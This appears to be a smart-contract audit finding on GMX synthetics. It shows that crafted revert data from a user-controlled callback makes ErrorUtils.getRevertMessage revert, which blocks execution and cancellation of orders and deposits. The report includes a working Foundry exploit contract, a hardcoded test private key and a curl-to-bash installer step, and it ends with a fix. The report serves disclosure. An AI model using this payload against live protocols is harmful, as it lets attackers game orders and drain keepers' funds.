0xdeadbeef

high

# Incomplete error handling causes execution and freezing/cancelling of Deposits/Withdrawals/Orders to fail.

## Summary

Users can define callbacks for Deposits/Withdrawals/Orders execution and cancellations.
GMX protocol attempts to manage errors during the execution of the callbacks 

A user controlled callback can return a specially crafted revert reason that will make the error handling revert.

By making the execution and cancelation revert, a malicious actor can game orders and waste keeper gas.

## Vulnerability Detail

The bug resides in `ErrorUtils`s `getRevertMessage`  that is called on every callback attempt. Example of deposit callback:
```solidity
try IDepositCallbackReceiver(deposit.callbackContract()).afterDepositExecution{ gas: deposit.callbackGasLimit() }(key, deposit) {
        } catch (bytes memory reasonBytes) {
            (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);
            emit AfterDepositExecutionError(key, deposit, reason, reasonBytes);
        }
```
`ErrorUtils`s `getRevertMessage`:
https://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/utils/ErrorUtils.sol#L7
```solidity
function getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {
        // If the result length is less than 68, then the transaction either panicked or failed silently
        if (result.length < 68) {
            return ("", false);
        }

        bytes4 errorSelector = getErrorSelectorFromData(result);

        // 0x08c379a0 is the selector for Error(string)
        // referenced from https://blog.soliditylang.org/2021/04/21/custom-errors/
        if (errorSelector == bytes4(0x08c379a0)) {
            assembly {
                result := add(result, 0x04)
            }

            return (abi.decode(result, (string)), true);
        }

        // error may be a custom error, return an empty string for this case
        return ("", false);
    }
```

As can be seen in the above above snippets, the `reasonBytes` from the catch statement is passed to `getRevertMessage` which tries to extract the `Error(string)` message from the revert.
The issue is that the data extracted from the revert can be crafted to revert on `abi.decode`. 

I will elaborate:
Correct (expected) revert data looks as follows:
1st 32 bytes: 0x000..64 (bytes memory size)
2nd 32 bytes: 0x08c379a0 (Error(string) selector)
3rd 32 bytes: offset to data
4th 32 bytes: length of data
5th 32 bytes: data 

`abi.decode` reverts if the data is not structure correctly.
There can be two reasons for revert:
1. if the 3rd 32 bytes (offset to data) is larger then the uint64 (0xffffffffffffffff)
	1. Simplified yul: `if gt(offset, 0xffffffffffffffff) { revert }`
2. if the 3rd 32 bytes (offset to data) is larger then the uint64 of the encoded data, the call will revert
	1. Simplieifed yul: `if iszero(slt(add(offset, 0x1f), size) { revert }`

By reverting with the following data in the callback, the `getRevertMessage` will revert:
0x000....64
0x0x08c379a0...000
0xffffffffffffffff....000
0x000...2
0x4141

## Impact

There are two impacts will occur when the error handling reverts:

### (1) Orders can be gamed
Since the following callbacks are controlled by the user,:
- `afterOrderExecution`
- `afterOrderCancellation`
- `afterOrderFrozen`

The user can decide when to send the malformed revert data and when not.
Essentially preventing keepers from freezing orders and from executing orders until it fits the attacker.

There are two ways to game the orders:
1. An attacker can create a risk free order, by setting a long increase order. If the market increases in his favor, he can decide to "unblock" the execution and receive profit. If the market decreases, he can cancel the order or wait for the right timing.
2. An attacker can create a limit order with a size larger then what is available in the pool. The attacker waits for the price to hit and then deposit into the pool to make the transaction work. This method is supposed to be prevented by freezing orders, but since the attacker can make the `freezeOrder` revert, the scenario becomes vulnerable again. 

### (2) drain keepers funds
Since exploiting the bug for both execution and cancellation, keepers will ALWAYS revert when trying to execute Deposits/Withdrawals/Orders.
The protocol promises to always pay keepers at-least the execution cost. By making the execution and cancellations revert the Deposits/Withdrawals/Orders will never be removed from the store and keepers transactions will keep reverting until potentially all their funds are wasted.

## Code Snippet

I have constructed an end-to-end POC in foundry. 

To get it running, first install foundry using the following command:
1. `curl -L https://foundry.paradigm.xyz | bash` (from https://book.getfoundry.sh/getting-started/installation#install-the-latest-release-by-using-foundryup)
4. If local node is not already running and contracts are not deployed, configured and funded - execute the following:
```bash
npx hardhat node
```
3 Perform the following set of commands from the repository root.
```bash
rm -rf foundry; foundryup; mkdir foundry; cd foundry; forge init --no-commit
```
5. Add the following to `foundry/test/NoneExecutableDeposits.t.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IExchangeRouter {
    function createDeposit(DrainWithdrawal.CreateDepositParams calldata params) external returns (bytes32);
}

interface IDepositHandler {
    function executeDeposit( bytes32 key, SetPricesParams calldata oracleParams) external;
}
interface IReader {
    function getMarket(address dataStore, address key) external view returns (Market.Props memory); 
}

interface IDataStore {
    function getBytes32(bytes32 key) external view returns (bytes32);
    function setUint(bytes32 key, uint256 value) external;
}
library Market {
    struct Props {
        address marketToken;
        address indexToken;
        address longToken;
        address shortToken;
    }
}
library Deposit {
    struct Props {
        Addresses addresses;
        Numbers numbers;
        Flags flags;
    }
    struct Addresses {
        address account;
        address receiver;
        address callbackContract;
        address market;
        address initialLongToken;
        address initialShortToken;
        address[] longTokenSwapPath;
        address[] shortTokenSwapPath;
    }
    struct Numbers {
        uint256 initialLongTokenAmount;
        uint256 initialShortTokenAmount;
        uint256 minMarketTokens;
        uint256 updatedAtBlock;
        uint256 executionFee;
        uint256 callbackGasLimit;
    }
    struct Flags {
        bool shouldUnwrapNativeToken;
    }
}
struct SetPricesParams {
    uint256 signerInfo;
    address[] tokens;
    uint256[] compactedMinOracleBlockNumbers;
    uint256[] compactedMaxOracleBlockNumbers;
    uint256[] compactedOracleTimestamps;
    uint256[] compactedDecimals;
    uint256[] compactedMinPrices;
    uint256[] compactedMinPricesIndexes;
    uint256[] compactedMaxPrices;
    uint256[] compactedMaxPricesIndexes;
    bytes[] signatures;
    address[] priceFeedTokens;
}

contract Keeper is Test {
    fallback() external payable {
    }
}

contract Callback is Test {
    function afterDepositExecution(bytes32 key, Deposit.Props memory deposit) external {
        assembly{
            let free_mem_ptr := mload(64)
            mstore(free_mem_ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
            mstore(add(free_mem_ptr, 4), 0xffffffffffffff ) // This will cause a revert 
            mstore(add(free_mem_ptr, 36), 8)
            mstore(add(free_mem_ptr, 68), "deadbeef")
            revert(free_mem_ptr, 100)
        }
    }
    function afterDepositCancellation(bytes32 key, Deposit.Props memory deposit) external {
        assembly{
            let free_mem_ptr := mload(64)
            mstore(free_mem_ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
            mstore(add(free_mem_ptr, 4), 0xffffffffffffff ) // This will cause a revert 
            mstore(add(free_mem_ptr, 36), 8)
            mstore(add(free_mem_ptr, 68), "deadbeef")
            revert(free_mem_ptr, 100)
        }
    }
}

interface IRoleStore{
    function grantRole(address account, bytes32 roleKey) external;
}

contract DrainWithdrawal is Test {
    struct CreateDepositParams {
        address receiver;
        address callbackContract;
        address market;
        address initialLongToken;
        address initialShortToken;
        address[] longTokenSwapPath;
        address[] shortTokenSwapPath;
        uint256 minMarketTokens;
        bool shouldUnwrapNativeToken;
        uint256 executionFee;
        uint256 callbackGasLimit;
    }

    uint256 public constant COMPACTED_64_BIT_LENGTH = 64;
    uint256 public constant COMPACTED_64_BITMASK = ~uint256(0) >> (256 - COMPACTED_64_BIT_LENGTH);
    
    uint256 public constant COMPACTED_32_BIT_LENGTH = 32;
    uint256 public constant COMPACTED_32_BITMASK = ~uint256(0) >> (256 - COMPACTED_32_BIT_LENGTH);

    uint256 public constant COMPACTED_8_BIT_LENGTH = 8;
    uint256 public constant COMPACTED_8_BITMASK = ~uint256(0) >> (256 - COMPACTED_8_BIT_LENGTH);

    IExchangeRouter EXCHANGE_ROUTER = IExchangeRouter(0x4bf010f1b9beDA5450a8dD702ED602A104ff65EE);
    address dataStore = 0x09635F643e140090A9A8Dcd712eD6285858ceBef;
    IReader reader = IReader(0xD49a0e9A4CD5979aE36840f542D2d7f02C4817Be);
    address WETH = 0x99bbA657f2BbC93c02D617f8bA121cB8Fc104Acf;
    address USDC = 0x9d4454B023096f34B160D6B654540c56A1F81688;
    address depositVault = 0xB0f05d25e41FbC2b52013099ED9616f1206Ae21B;
    address controller = 0x1429859428C0aBc9C2C47C8Ee9FBaf82cFA0F20f;
    address roleStore = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    address ROLE_ADMIN = 0xe1Fd27F4390DcBE165f4D60DBF821e4B9Bb02dEd;
    IDepositHandler depositHandler = IDepositHandler(0xD42912755319665397FF090fBB63B1a31aE87Cee);

    address signer = 0xBcd4042DE499D14e55001CcbB24a551F3b954096;
    uint256 pk = 0xf214f2b2cd398c806f84e317254e0f0b801d0643303237d97a22a48e01628897;

    Callback callback = new Callback();
    Keeper ORDER_KEEPER = new Keeper();

    using Market for Market.Props;


    function setUp() public {
    }
    function testNoneExecutableDeposits() external {
        // Setup market
        Market.Props memory market = reader.getMarket(dataStore, address(0xc50051e38C72DC671C6Ae48f1e278C1919343529));
        address marketWethUsdc = market.marketToken;
        address wethIndex = market.indexToken;
        address wethLong = market.longToken;
        address usdcShort = market.shortToken;
        vm.startPrank(controller);
        IDataStore(dataStore).setUint(keccak256(abi.encode("EXECUTION_GAS_FEE_MULTIPLIER_FACTOR")), 10**30); // defualt
        IDataStore(dataStore).setUint(keccak256(abi.encode("NATIVE_TOKEN_TRANSFER_GAS_LIMIT")),10000); // default
        vm.stopPrank();

        vm.prank(ROLE_ADMIN);
        IRoleStore(roleStore).grantRole(address(ORDER_KEEPER), keccak256(abi.encode("ORDER_KEEPER")));

        // validate weth long usdc short index weth
        assertEq(WETH, wethLong);
        assertEq(WETH, wethIndex);
        assertEq(USDC, usdcShort);

        // initial fund deposit vault and weth 
        address[] memory addrArray; 
        deal(USDC, depositVault, 1000 ether);
        vm.deal(depositVault, 1000 ether);
        vm.prank(depositVault);
        WETH.call{value: 1000 ether}(abi.encodeWithSelector(bytes4(keccak256("deposit()"))));
        vm.deal(WETH, 1000 ether);

        // Create deposit params
        CreateDepositParams memory deposit = CreateDepositParams(
            address(this), // receiver
            address(callback), // callback 
            marketWethUsdc, // market
            wethLong, // inital longtoken
            usdcShort, // inital short token
            addrArray, // longtokenswappath
            addrArray, // shortokenswappath
            0, // minmarkettokens
            true,// shouldunwrapnativetoken
            1000, // executionfee
            2000000 // callbackGasLimit
        );

        // Create deposit!
        bytes32 depositKey = EXCHANGE_ROUTER.createDeposit(deposit);

        // Attempt to execute deposit
        vm.startPrank(address(ORDER_KEEPER));
        SetPricesParams memory params = getPriceParams();
        vm.expectRevert(); // validate that the below function will revert
        depositHandler.executeDeposit(depositKey, params);
        vm.stopPrank();

    }

    function getPriceParams() internal returns (SetPricesParams memory) {
        address[] memory tokens = new address[](2);
        tokens[0] = WETH;
        tokens[1] = USDC;
        
        // min oracle block numbers
        uint256[] memory uncompactedMinOracleBlockNumbers = new uint256[](2);
        uncompactedMinOracleBlockNumbers[0] = block.number;
        uncompactedMinOracleBlockNumbers[1] = block.number;

        // decimals 18
        uint256[] memory uncompactedDecimals = new uint256[](2);
        uncompactedDecimals[0] = 18;
        uncompactedDecimals[1] = 18;

        // max price AGE
        uint256[] memory uncompactedMaxPriceAge = new uint256[](2);
        uncompactedMaxPriceAge[0] = block.timestamp;
        uncompactedMaxPriceAge[1] = block.timestamp;
        
        uint256[] memory uncompactedMaxPricesIndexes = new uint256[](2);
        uncompactedMaxPricesIndexes[0] = 0;
        uncompactedMaxPricesIndexes[1] = 0;

        uint256[] memory uncompactedMaxPrices = new uint256[](2);
        uncompactedMaxPrices[0] = 1000;
        uncompactedMaxPrices[1] = 1000;

        // signerInfo
        uint256 signerInfo = 1;
        uint256[] memory compactedMinOracleBlockNumbers = getCompactedValues(uncompactedMinOracleBlockNumbers, COMPACTED_64_BIT_LENGTH, COMPACTED_64_BITMASK);
        uint256[] memory compactedDecimals = getCompactedValues(uncompactedDecimals, COMPACTED_8_BIT_LENGTH, COMPACTED_8_BITMASK);
        uint256[] memory compactedMaxPriceAge = getCompactedValues(uncompactedMaxPriceAge, COMPACTED_64_BIT_LENGTH, COMPACTED_64_BITMASK);
        uint256[] memory compactedMaxPricesIndexes = getCompactedValues(uncompactedMaxPricesIndexes, COMPACTED_8_BIT_LENGTH, COMPACTED_8_BITMASK);
        uint256[] memory compactedMaxPrices = getCompactedValues(uncompactedMaxPrices, COMPACTED_32_BIT_LENGTH, COMPACTED_32_BITMASK);

        bytes[] memory sig = getSig(tokens, uncompactedDecimals, uncompactedMaxPrices);

        SetPricesParams memory oracleParams = SetPricesParams(
            signerInfo, // signerInfo
            tokens, //tokens
            compactedMinOracleBlockNumbers, // compactedMinOracleBlockNumbers
            compactedMinOracleBlockNumbers, //compactedMaxOracleBlockNumbers
            compactedMaxPriceAge, //  compactedOracleTimestamps
            compactedDecimals, // compactedDecimals
            compactedMaxPrices, // compactedMinPrices
            compactedMaxPricesIndexes, // compactedMinPricesIndexes
            compactedMaxPrices, // compactedMaxPrices
            compactedMaxPricesIndexes, // compactedMaxPricesIndexes
            sig, // signatures
            new address[](0) // priceFeedTokens
        );
        return oracleParams;
    }

    function getSig(address[] memory tokens, uint256[] memory decimals, uint256[] memory prices) internal returns (bytes[] memory){
        signer = vm.addr(pk);
        bytes[] memory ret = new bytes[](tokens.length);
        for(uint256 i=0; i<tokens.length; i++){
            bytes32 digest = toEthSignedMessageHash(
                keccak256(abi.encode(
                    keccak256(abi.encode(block.chainid, "xget-oracle-v1")),
                    block.number,
                    block.number,
                    block.timestamp,
                    bytes32(0),
                    tokens[i],
                    getDataStoreValueForToken(tokens[i]),
                    10 ** decimals[i],
                    prices[i],
                    prices[i]
                ))
            );
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
            ret[i] = abi.encodePacked(r,s,v);
        }
        return ret;
    }

    function getDataStoreValueForToken(address token) internal returns (bytes32) {
        return IDataStore(dataStore).getBytes32(keccak256(abi.encode(keccak256(abi.encode("ORACLE_TYPE")), token)));
    }

    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32 message) {
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32")
            mstore(0x1c, hash)
            message := keccak256(0x00, 0x3c)
        }
    }
    function getCompactedValues(
        uint256[] memory uncompactedValues,
        uint256 compactedValueBitLength,
        uint256 bitmask
    ) internal returns (uint256[] memory) {
        uint256 compactedValuesPerSlot = 256 / compactedValueBitLength;
        bool stopLoop = false;
        uint256[] memory compactedValues = new uint256[](uncompactedValues.length / compactedValuesPerSlot + 1);
        for(uint256 i=0; i < (uncompactedValues.length - 1) / compactedValuesPerSlot + 1; i++){
            uint256 valuePerSlot;
            for(uint256 j=0; j< compactedValuesPerSlot; j++){
                uint256 index = i * compactedValuesPerSlot + j;
                if(index >= uncompactedValues.length) {
                    stopLoop = true;
                    break;
                }
                uint256 value = uncompactedValues[index];
                uint256 bitValue = value << (j * compactedValueBitLength);
                valuePerSlot = valuePerSlot | bitValue;
            }
            compactedValues[i] = valuePerSlot;
            if(stopLoop){
                break;
            }
        }
        return compactedValues;
    }
}

```
6. execute `forge test --fork-url="http://127.0.0.1:8545"  -v -m testNoneExecutableDeposits`

## Tool used

VS Code, Foundry

## Recommendation

When parsing the revert reason, validate the offsets are smaller then the length of the encoding.
